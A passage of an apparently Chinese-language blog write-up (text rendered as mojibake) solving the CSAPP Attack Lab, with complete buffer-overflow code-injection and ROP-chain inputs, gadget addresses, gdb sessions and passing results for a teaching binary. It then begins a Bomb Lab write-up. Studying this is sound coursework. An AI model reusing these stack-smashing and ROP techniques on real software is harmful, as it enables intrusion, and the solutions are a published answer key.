  4017bd:    c3                       retq   
  4017be:    90                       nop
  4017bf:    90                       nop
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ ˆä¸Šåˆ†é…äº†0x28å³40å­—èŠ‚çš„ç©ºé—´ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥è¶…è¿‡äº†40å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨Getsçš„ä¸å®‰å…¨æ€§ï¼Œå³å¯è¦†ç›–æ ˆä¸Šçš„getbufçš„è¿”å›åœ°å€ã€‚</p>
<p>å®éªŒå·¥å…·ä¸­æœ‰ä¸€ä¸ªå«åšhex2rawçš„å­—èŠ‚ç è½¬æ¢å·¥å…·ï¼Œå¼€å§‹æ²¡å¼„æ‡‚ä»€ä¹ˆæ„æ€ï¼Œçœ‹äº†è¿™ç¯‡<a href="https://mcginn7.github.io/2020/02/19/CSAPP-attacklab/">åšæ–‡</a>æ‰æƒ³é€šã€‚åŸæ¥è¿™ä¸ªå·¥å…·å¯ä»¥å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¡¨ç¤ºçš„åå…­è¿›åˆ¶å­—èŠ‚ç è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚æ³¨æ„ï¼Œè¾“å…¥åˆ°hex2rawçš„æ¯ä¸ªå­—èŠ‚ï¼ˆ8bitï¼‰ç”¨ä¸¤ä½åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç”¨ç©ºæ ¼æˆ–æ¢è¡Œç¬¦åˆ†å¼€æ¯ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚å¦‚ä¸‹æ˜¯ä½¿ç”¨ç¤ºä¾‹ï¼šï¼ˆå­—ç¬¦'A'çš„asciiç æ˜¯0x41ï¼‰</p>
<p>æ‰€ä»¥è¦å®Œæˆattackï¼Œéœ€è¦è¾“å…¥48å­—èŠ‚ï¼Œç”±äºx86æ˜¯å°ç«¯ç¼–å€ï¼Œä½å­—èŠ‚åœ¨ä½åœ°å€ã€‚æ¯ä¸ªå­—ç¬¦ä¾æ¬¡ä»($rsp)å¡«å……åˆ°($rsp+47)æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œæ‰€ä»¥å¯¹äºæœ€å8ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬åº”è¯¥å…ˆè¾“å…¥ä½äºä½å­—èŠ‚çš„è¿”å›åœ°å€çš„å8ä½0xc0ã€‚æœ€ç»ˆçš„byteså†…å®¹æ˜¯ï¼š</p>
<pre><code class="language-txt">00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
</code></pre>
<p>ç”¨hex2rawè½¬æ¢åä½œä¸ºctargetçš„è¾“å…¥ï¼Œå¯ä»¥å®ç°code-injectionæ”»å‡»(call touch1)ã€‚</p>
<h2 id="ctarget-level2"><a class="header" href="#ctarget-level2">CTarget level2</a></h2>
<p>è¿™æ¬¡çš„æ³¨å…¥æ”»å‡»ä¸ä»…è¦æ±‚æ§åˆ¶è·³è½¬ï¼Œè¿˜éœ€è¦æ‰§è¡Œä¸€äº›é¢å¤–çš„æ·»åŠ æŒ‡ä»¤ã€‚è¦æ±‚æ‰§è¡Œå‡½æ•°touch2ä¸­çš„æŒ‡å®šifåˆ†æ”¯ï¼Œæ‰€ä»¥è¿˜éœ€è¦è®¾ç½®touch2ä¼ é€’çš„å‚æ•°ã€‚</p>
<pre><code class="language-c">void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {
        printf(&quot;Touch 2! You have called touch2(0x%.8x)\n&quot;, val);
        validate(2);
    } else {
        printf(&quot;Misfire! You have called touch2(0x%.8x)\n&quot;, val);
        fail(2);
    }
    exit(0);
}
</code></pre>
<p>ç”±äºä¸ä»…è¦ä½¿å¾—getbufå‡½æ•°ç»“æŸåæ§åˆ¶è·³è½¬åˆ°touch2ï¼Œè¿˜å¿…é¡»è®¾ç½®å‚æ•°valï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ä¿å­˜åœ¨$rdi)ä¸ºcookieï¼Œæ‰èƒ½æ­£ç¡®è§¦å‘æ”»å‡»ã€‚å…ˆæŸ¥çœ‹touch2çš„æ±‡ç¼–ä»£ç ï¼š</p>
<pre><code class="language-x86asm">00000000004017ec &lt;touch2&gt;:
  4017ec:    48 83 ec 08              sub    $0x8,%rsp
  4017f0:    89 fa                    mov    %edi,%edx
  4017f2:    c7 05 e0 2c 20 00 02     movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;
  4017f9:    00 00 00 
  4017fc:    3b 3d e2 2c 20 00        cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;
  401802:    75 20                    jne    401824 &lt;touch2+0x38&gt;
  401804:    be e8 30 40 00           mov    $0x4030e8,%esi
  401809:    bf 01 00 00 00           mov    $0x1,%edi
  40180e:    b8 00 00 00 00           mov    $0x0,%eax
  401813:    e8 d8 f5 ff ff           callq  400df0 &lt;__printf_chk@plt&gt;
</code></pre>
<p>å‘ç°å‚æ•°valä¸(0x202ce2 + $rip)æ‰€æŒ‡å‘çš„å€¼æ¯”è¾ƒï¼Œå³ä¸cookieæ¯”è¾ƒã€‚éœ€è¦ç”¨gdbæŸ¥çœ‹cookieï¼Œä½†æ˜¯æ³¨æ„ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼æˆ‘ä¸€å¼€å§‹æ˜¯æŠŠæ–­ç‚¹æ‰“åˆ°äº†<br />
4017fc:Â Â  Â 3b 3d e2 2c 20 00 Â  Â Â Â  Â cmp Â  Â 0x202ce2(%rip),%ediÂ </p>
<p>è¿™æ¡æŒ‡ä»¤ï¼Œå³<code>(gdb) break *0x4017fc</code>ã€‚åœ¨æ­¤æ—¶æ‰“å°cookieçš„å€¼ä¸ºï¼š</p>
<pre><code>    (gdb) print /x *(unsigned *)($rip + 0x202ce2)$15 = 0x2f8a0000
</code></pre>
<p>ä½†æ˜¯æ³¨æ„gdbè¢«æ‰“åˆ°æ–­ç‚¹æ—¶çš„æŒ‡ä»¤æ˜¯è¿˜æœªè¿è¡Œçš„æŒ‡ä»¤ï¼Œæ‰€ä»¥æ­¤æ—¶çš„ripå¹¶ä¸æ˜¯æŒ‡å‘æ–­ç‚¹æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¹Ÿå°±ä¸æ˜¯çœŸæ­£çš„å‚ä¸cmpè¿ç®—çš„ripçš„å€¼ï¼Œæ‰€ä»¥è¦é€šè¿‡stepiï¼Œä½¿æ–­ç‚¹æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè¿™æ—¶å€™æŸ¥çœ‹($rip + 0x202ce2)æ‰€æŒ‡å‘çš„å€¼ï¼š</p>
<pre><code>(gdb) print /x *(int *)($rip + 0x202ce2)$17 = 0x59b997fa
(gdb) print $rip$18 = (void (*)()) 0x401802 &lt;touch2+22&gt;
</code></pre>
<p>æ‰€ä»¥0x59b997faæ‰æ˜¯æ­£ç¡®çš„cookieçš„å€¼ã€‚</p>
<p>ç°åœ¨å¯ä»¥ç¼–å†™éœ€è¦æ³¨å…¥çš„ä»£ç äº†ã€‚å³è®¾ç½®$rdiçš„å€¼ä¸ºcookieï¼Œä¹‹åå°†æ§åˆ¶è·³è½¬åˆ°touch2ï¼Œå¯ä»¥å…ˆä½¿ç”¨pushæŒ‡ä»¤å°†touch2çš„å…¥å£åœ°å€å‹æ ˆï¼Œå†ä½¿ç”¨retæŒ‡ä»¤ä»æ ˆä¸­è·å–è¿”å›åœ°å€ï¼Œä»è€Œè·³è½¬åˆ°touch2ã€‚è¿™æ®µä»£ç ä¿å­˜åœ¨code.sæ–‡ä»¶ä¸­ï¼š</p>
<pre><code class="language-x86asm">mov $0x59b997fa, %rdi
push $0x4017ec
ret
</code></pre>
<p>å†ä½¿ç”¨gccç¼–è¯‘code.sä¸ºcode.oç›®æ ‡æ–‡ä»¶ï¼Œå†ç”¨objdumpåæ±‡ç¼–è¿™æ®µä»£ç ï¼Œå¾—åˆ°è¿™æ®µä»£ç çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim code.s
sugar@ubuntuServer:~/csappLab/attacklab$ gcc -Og -c code.s
sugar@ubuntuServer:~/csappLab/attacklab$ objdump -d code.o
code.o:     file format elf64-x86-64
Disassembly of section .text:
0000000000000000 &lt;.text&gt;:
   0:    48 c7 c7 fa 97 b9 59     mov    $0x59b997fa,%rdi
   7:    68 ec 17 40 00           pushq  $0x4017ec
   c:    c3                       retq  
</code></pre>
<p>æœ€åä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è®©ç¨‹åºctargetæ‰§è¡Œè¿™æ®µä»£ç å‘¢ï¼Ÿç”±äºæˆ‘ä»¬åªèƒ½ä»¥Getså‡½æ•°ä¸ºçªç ´å£ï¼Œè¾“å…¥å­—ç¬¦ä¸²ä¿å­˜åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥ä¸ä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œæˆ‘ä»¬é€šè¿‡è¦†ç›–getbufçš„è¿”å›åœ°å€ï¼Œä½†è¿™æ¬¡è®©æ–°è¿”å›åœ°å€æŒ‡å‘bufferçš„èµ·å§‹åœ°å€ï¼Œç”±äºgetbufåœ¨æ ˆä¸Šåˆ†é…äº†bufferçš„ç©ºé—´ï¼ˆé€šè¿‡å‡$rspåˆ†é…äº†40Bytesçš„ç©ºé—´ï¼‰ï¼Œè¿™å°±æ˜¯ç•™ç»™æˆ‘ä»¬æ³¨å…¥ä»£ç çš„ä½ç½®ã€‚åœ¨getbufå‡½æ•°æ‰§è¡ŒretæŒ‡ä»¤åï¼Œè·³è½¬åˆ°æˆ‘ä»¬æ³¨å…¥çš„ä»£ç å¼€å§‹æ‰§è¡Œã€‚</p>
<p><img src="./images/blog20210219/buf.png" alt="" /></p>
<p>æ‰¾åˆ°bufferè¢«åˆ†é…åˆ°çš„åœ°å€</p>
<pre><code class="language-txt">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14    buf.c: No such file or directory.
(gdb) print $rsp
$1 = (void *) 0x5561dc78
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥bytesæ–‡ä»¶ä¸ºï¼š</p>
<pre><code class="language-txt">48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
</code></pre>
<p>å¯ä»¥æ­£ç¡®å®Œæˆæ”»å‡»ï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim bytes 
sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
sugar@ubuntuServer:~/csappLab/attacklab$ ./ctarget -q -i args.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
    user id    bovik
    course    15213-f15
    lab    attacklab
    result    1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
</code></pre>
<h2 id="ctarget-level3"><a class="header" href="#ctarget-level3">Ctarget level3</a></h2>
<p>éœ€è¦è®©ctargetæ‰§è¡Œtouch3çš„æŒ‡å®šåˆ†æ”¯ï¼Œä¸touch2ç±»ä¼¼ï¼Œåªä¸è¿‡å‚æ•°å˜æˆäº†æŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚è¦æ±‚è¯¥å­—ç¬¦ä¸²çš„å€¼ä¸cookieçš„æ— ç¬¦å·å€¼çš„åå…­è¿›åˆ¶å­—ç¬¦è¡¨ç¤ºç›¸ç­‰ï¼Œå³å­—ç¬¦ä¸²æ˜¯Â <code>59b997fa</code>ã€‚</p>
<p>åŒæ ·éœ€è¦å°†getbufçš„è¿”å›åœ°å€è¦†ç›–ä¸ºæ³¨å…¥ä»£ç çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿä¸touch2ç›¸åŒä¸ºï¼š0x5561dc78ã€‚</p>
<p>ç”±äºhexmatchå‡½æ•°è¿˜ä¼šåœ¨æ ˆä¸Šéšæœºçš„ç ´å128å­—èŠ‚çš„bufferç©ºé—´ï¼Œä¸ºäº†ä¸è®©hexmatchå‡½æ•°ç ´åæˆ‘ä»¬è®¾ç½®çš„å­—ç¬¦ä¸²ï¼Œæ³¨å…¥çš„ä»£ç å¯ä»¥å°†rspå‡å»ä¸€å®šçš„å€¼ï¼ˆè‡³å°‘ä¿è¯rspçš„æ–°å€è¶…è¿‡å­—ç¬¦ä¸²å­˜å‚¨çš„èµ·å§‹åœ°å€ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢å­—ç¬¦ä¸²è¢«ç ´åäº†ã€‚</p>
<p>touchçš„å‚æ•°ä¿å­˜åœ¨rdiä¸­ï¼Œç›®å‰è¿˜ä¸ç¡®å®šå­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œå¯ä»¥éšä¾¿å†™ä¸€ä¸ª</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim code.s 
sugar@ubuntuServer:~/csappLab/attacklab$ gcc -Og -c code.s
sugar@ubuntuServer:~/csappLab/attacklab$ objdump -d code.o

code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0: 48 c7 c7 ff 17 40 00    mov    $0x4017ff,%rdi
   7: 48 83 ec 10             sub    $0x40,%rsp
   b: 68 fa 18 40 00          pushq  $0x4018fa
  10: c3                      retq   
sugar@ubuntuServer:~/csappLab/attacklab$ cat code.s
mov $0x4017ff, %rdi
sub $16, %rsp
push $0x4018fa
ret
</code></pre>
<p>è®¡ç®—çœŸæ­£çš„stringéœ€è¦å¡«å……åˆ°çš„ä½ç½®ï¼šï¼ˆbufferèµ·å§‹åœ°å€åŠ ä¸Šæ³¨å…¥ä»£ç çš„å­—èŠ‚ç é•¿åº¦ï¼‰</p>
<pre><code>(gdb) print /x (0x5561dc78 + 17)
$2 = 0x5561dc89
</code></pre>
<p>é‡æ–°ç”Ÿæˆæ³¨å…¥ä»£ç </p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0: 48 c7 c7 89 dc 61 55    mov    $0x5561dc89,%rdi
   7: 48 83 ec 40             sub    $0x40,%rsp
   b: 68 fa 18 40 00          pushq  $0x4018fa
  10: c3                      retq
</code></pre>
<p>ä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸã€‚å‘ç°é—®é¢˜ï¼Œæˆ‘åœ¨bytesä¸­å†™çš„59b997faæ˜¯ç›´æ¥å†™å…¥çš„ï¼Œä½†æ˜¯è¦æŠŠæ¯ä¸ªæ•°è½¬ä¸ºasciiç ï¼š<br />
å­—ç¬¦ï¼š Â  Â  Â 5 Â 9 Â b Â 9 Â 9 Â 7 Â f Â a<br />
å¯¹åº”asciiï¼š 35 39 62 39 39 37 66 61</p>
<p>å†å†™å…¥bytesæ–‡ä»¶ï¼š</p>
<pre><code class="language-txt">48 c7 c7 89 dc 61 55 48
83 ec 40 68 fa 18 40 00
c3 35 39 62 39 39 37 66
61 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
</code></pre>
<p>æˆåŠŸï¼</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim bytes 
sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
sugar@ubuntuServer:~/csappLab/attacklab$ ./ctarget -q -i args.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&quot;59b997fa&quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
   user id  bovik
   course   15213-f15
   lab   attacklab
   result   1:PASS:0xffffffff:ctarget:3:48 C7 C7 89 DC 61 55 48 83 EC 40 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
</code></pre>
<h2 id="rtarget-level2"><a class="header" href="#rtarget-level2">Rtarget level2</a></h2>
<p>ä½¿ç”¨Return-Oriented Programming æ¥å®ŒæˆåŒæ ·çš„touch2çš„æ”»å‡»ã€‚è¿™æ¬¡çš„é™åˆ¶æ¡ä»¶æ˜¯ä¸èƒ½åœ¨æ ˆä¸Šæ³¨å…¥ä»£ç ï¼Œå› ä¸ºrtargetä½¿ç”¨äº†æ ˆéšæœºåŒ–å’Œæ®µæ£€æŸ¥ï¼Œå¯¼è‡´ç¨‹åºä¸èƒ½æ‰§è¡Œæ ˆä¸Šçš„ä»£ç ã€‚ç”±äºæˆ‘ä¸ä¿¡ï¼Œæ‰€ä»¥æ¥éªŒè¯ä¸€ä¸‹ï¼š</p>
<p>æ ˆéšæœºåŒ–ï¼š</p>
<pre><code class="language-sh">Breakpoint 1, getbuf () at buf.c:16
16  buf.c: No such file or directory.
(gdb) print $rsp
$1 = (void *) 0x7ffffffb16d0
(gdb) kill
Kill the program being debugged? (y or n) y
(gdb) run -q -i args.txt 
Starting program: /home/sugar/csappLab/attacklab/rtarget -q -i args.txt
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:16
16  in buf.c
(gdb) print $rs
$2 = (void *) 0x7ffffffa6d50
</code></pre>
<p>å‘ç°ç¡®å®ä¸¤æ¬¡ç›¸åŒæ–­ç‚¹ä½ç½®çš„rspçš„å€¼ä¸åŒã€‚</p>
<p>ç¦æ­¢æ‰§è¡Œæ ˆä¸Šçš„ä»£ç </p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:.......
</code></pre>
<p>æ ¹æ®writeupä¸­çš„è¯´æ˜ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨bufferçš„æº¢å‡ºæ¥æ³¨å…¥ä¸€äº›æ•°æ®ï¼Œä½†æ˜¯è¿™æ¬¡åªèƒ½åˆ©ç”¨æºç¨‹åºæ±‡ç¼–ä»£ç ä¸­å·²æœ‰çš„å­—èŠ‚ç ï¼Œæ–­ç« å–ä¹‰ï¼Œæ‹¼å‡‘å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ã€‚</p>
<p>æ¯”å¦‚</p>
<pre><code class="language-x86asm">c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
c3                      retq
</code></pre>
<p>å¯ä»¥æ–­ç« å–ä¹‰ä¸ºï¼š</p>
<pre><code class="language-x86asm">48 89 c7Â  Â  Â movq %rax, %rdi
c3Â  Â  Â retq
</code></pre>
<p>æ‰€ä»¥åœ¨åˆ©ç”¨bufferæº¢å‡ºçš„æ—¶å€™ï¼Œåœ¨æ ˆä¸Šå¡«å†™æˆ‘ä»¬æƒ³è¦çš„åœ°å€æˆ–è€…æ•°æ®ï¼Œå†ä»æºç¨‹åºä¸­æ‰¾åˆ°å¯ä»¥æ„æˆæœ‰æ„ä¹‰çš„ä»£ç çš„ç‰‡æ®µï¼Œå®Œæˆæ”»å‡»ã€‚writeupä¸­æç¤ºï¼Œå¯ä»¥åœ¨rtargetçš„å‡½æ•°start_farmå’Œmid_farmä¹‹é—´çš„æ±‡ç¼–ä»£ç ä¸­æ‰¾åˆ°æƒ³è¦çš„ï¼Œæ‰€ä»¥æ‰¾å°±å®Œäº‹äº†ã€‚ä¸‹é¢æ˜¯rtargetçš„åæ±‡ç¼–æ–‡ä»¶éƒ¨åˆ†å†…å®¹ï¼š</p>
<pre><code class="language-x86asm">0000000000401994 :
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   
...

00000000004019a7 :
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
...
00000000004019c3 :
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca :
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 :
</code></pre>
<p>ä¸‹å›¾æ˜¯æ ˆä¸Šçš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæœ€ç»ˆçš„æ”»å‡»é€»è¾‘ï¼š</p>
<pre><code class="language-txt">            64bit          0
            +--------------+ 0 byte
            |   0x4017ec   |   --&gt; touch2çš„èµ·å§‹åœ°å€
            +--------------+ -8
            |   0x4019c5   |   --&gt; 48 89 c7, 90, c3 -&gt; movq %rax, %rdi | nop | ret (è®¾ç½®äº†touch2çš„å‚æ•°)
            +--------------+ -16
            |  0x59b997fa  |    --&gt; cookieçš„å€¼ï¼Œä¹Ÿå°±æ˜¯touch2çš„å‚æ•°
            +--------------+ -24
  getbuf -&gt; |  0x4019ab    |    --&gt; 58, 90, c3 -&gt; popq %rax | nop | ret (æ­¤æ—¶rspçš„å€¼ä¸º-8ï¼Œå³retè·³è½¬åˆ°0x4019c5)
ret address +--------------+ -32
            |              |
            |              |
            |              |
            +--------------+ &lt;- bufferèµ·å§‹åœ°å€ -72```
å³æˆ‘ä»¬è®©ç¨‹åºæœ€ç»ˆæ‰§è¡Œçš„ä»£ç ï¼ˆåœ¨getbufçš„retæŒ‡ä»¤åã€touch2å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å‰ï¼‰å¯ä»¥è®¤ä¸ºæ˜¯ï¼š
```x86asm
popq %rax
nop
ret
movq %rax, %rdi
nop
ret
</code></pre>
<p>å®Œæˆäº†ROPæ”»å‡»ï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ cat bytes 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
</code></pre>
<h2 id="rtarget-level3"><a class="header" href="#rtarget-level3">Rtarget level3</a></h2>
<p>ç”¨ROPå¯¹touch3åšæ”»å‡»ï¼Œæ‰€éœ€è¦çš„gatgetåœ¨start_farmåˆ°end_farmä¹‹é—´ï¼Œæ‰€ä»¥å…ˆæŠŠèƒ½æ‰¾åˆ°çš„gatgetéƒ½ç¿»è¯‘å‡ºæ¥ï¼Œåˆ°æ—¶å€™è¦ç”¨çš„æ—¶å€™ç›´æ¥å¯ä»¥æ‰¾åˆ°ã€‚è¿™ä¸ªçš„éš¾ç‚¹å°±æ˜¯è®¡ç®—å­—ç¬¦ä¸²å‚æ•°çš„åœ°å€ï¼Œéœ€è¦ç”¨åˆ°å·²ç»æä¾›çš„leaæŒ‡ä»¤ï¼Œ<code>lea (rdi, rsi, 1), rax</code> . æˆ‘è¿™è¾¹ç”»å‡ºæœ€ç»ˆæ”»å‡»åçš„æ ˆçš„å†…å®¹ï¼Œå¯ä»¥å¾ˆå¥½ç†è§£äº†ã€‚</p>
<pre><code class="language-txt">            64bit          0
            +--------------+
            | cookie       |  = &quot;59b997fa&quot; =&gt; 35 39 62 39 39 37 66 61
            +--------------+
            |   0x4018fa   |  --&gt; touch3çš„å…¥å£åœ°å€
            +--------------+
            |   0x4019c5   |  --&gt; mov rax, rdi ï½œ ret  # ä¿å­˜åˆ°ç¬¬ä¸€ä¸ªå‚æ•°
            +--------------+
            |   0x4019d6   |   --&gt; lea (rdi, rsi, 1), rax  # è®¡ç®—stringçš„çœŸå®åœ°å€
            +--------------+
            |   0x401a27   |   --&gt; mov ecx, esi  | ret
            +--------------+
            |  0x401a34    |    --&gt; mov edx, ecx  | ret
            +--------------+
            |   0x401a42   |  --&gt; mov eax, edx  | ret
            +--------------+ 0 byte
            |   0x48       |   --&gt; stringçš„åç§»é‡
            +--------------+ -8
            |   0x4019ab   |   --&gt; popq rax (stringåœ¨æ ˆä¸Šçš„åç§»é‡)  | ret
            +--------------+ -16
            |  0x4019c5    |    --&gt; movq rax, rdi   | ret
            +--------------+ -24
  getbuf -&gt; |  0x401aad    |    --&gt; movq rsp, rax  | ret  # ä»¥å½“å‰çš„rspä½œä¸ºåŸºå€
ret address +--------------+ -32
            |              |
            |              |
            |              |
            +--------------+ &lt;- bufferèµ·å§‹åœ°å€ -72
</code></pre>
<p>bytesæ–‡ä»¶çš„å†…å®¹</p>
<pre><code class="language-txt">00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
</code></pre>
<p>å®Œæˆäº†æ”»å‡»ï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes  &gt; args.txt 
sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&quot;59b997fa&quot;)
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
  user id bovik
  course  15213-f15
  lab attacklab
  result  1:PASS:0xffffffff:rtarget:
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---bomb-lab"><a class="header" href="#csapp---bomb-lab">CSAPP - Bomb Lab</a></h1>
<p>ä»å¯æ‰§è¡Œæ–‡ä»¶å‡ºå‘ï¼Œåˆ©ç”¨<a href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">gdb</a>ã€<a href="https://man.linuxde.net/objdump">objdump</a>ç­‰å·¥å…·æ£€æŸ¥å‡ºæ­£ç¡®çš„ç‚¸å¼¹æ‹†è§£å¯†ç ä¸²ã€‚</p>
<p><strong>objdumpå‘½ä»¤</strong>æ˜¯ç”¨æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶ï¼ˆapp.oï¼‰æˆ–è€…å¯æ‰§è¡Œçš„ç›®æ ‡æ–‡ä»¶ï¼ˆappï¼‰çš„æ„æˆçš„<a href="http://man.linuxde.net/gcc" title="gccå‘½ä»¤">gcc</a>å·¥å…·ã€‚</p>
<p>é¦–å…ˆä½¿ç”¨ $objdump -d bomb &gt;&gt; bomb.a å‘½ä»¤disassembleå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡å®šå‘è¾“å‡ºåˆ°bomb.aæ–‡ä»¶ã€‚æ¥ç€å°±å¯ä»¥ç”¨gdbæ¥è°ƒè¯•bombï¼ŒåŒæ—¶å…³æ³¨bomb.açš„æ±‡ç¼–ä»£ç ã€‚</p>
<p>æ‰¾åˆ°ç¨‹åºå…¥å£mainã€‚å¯¹æ¯”æ±‡ç¼–ä»£ç ï¼Œè¿›è¡Œgdbè°ƒè¯•ã€‚åœ¨bomb.cæ–‡ä»¶ä¸­å¯ä»¥çœ‹å¤§ä½“çš„ç¨‹åºç»“æ„ã€‚mainå‡½æ•°ä¸­ï¼Œéƒ½æ˜¯å…ˆè¯»å–ä¸€è¡Œè¾“å…¥ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²åœ°å€ä¿å­˜$rdiä¸­ï¼Œå¯ä»¥åœ¨gdbä¸­ä½¿ç”¨ (gdb) print (char *)($rdi) æŸ¥çœ‹ã€‚ä¹‹åè°ƒç”¨phase_xå‡½æ•°ï¼Œphase_xä¸­ä¼šå¯¹è¾“å…¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è§¦å‘ç‚¸å¼¹ã€‚</p>
<h2 id="phase_1"><a class="header" href="#phase_1">phase_1</a></h2>
<p>æ ¹æ®æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œstrings_not_equalè¿˜éœ€è¦ä¸€ä¸ªå‚æ•°ï¼šesiï¼Œå¯ä»¥ç”¨gdbæŸ¥çœ‹å†…å­˜0x402400æ‰€åœ¨ä½ç½®çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆã€‚</p>
